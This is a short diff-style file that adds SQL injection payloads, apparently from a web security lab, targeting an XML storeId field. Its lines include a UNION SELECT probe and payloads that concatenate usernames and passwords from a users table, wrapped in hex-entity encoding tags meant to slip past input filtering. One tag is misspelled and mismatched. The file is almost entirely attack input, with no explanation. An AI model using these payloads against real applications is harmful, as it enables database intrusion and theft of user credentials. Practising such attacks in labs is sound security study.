@@ -1,0 +1,4 @@
+1 UNION SELECT NULL
+
+<@hex_entiities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities>
+<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></storeId>
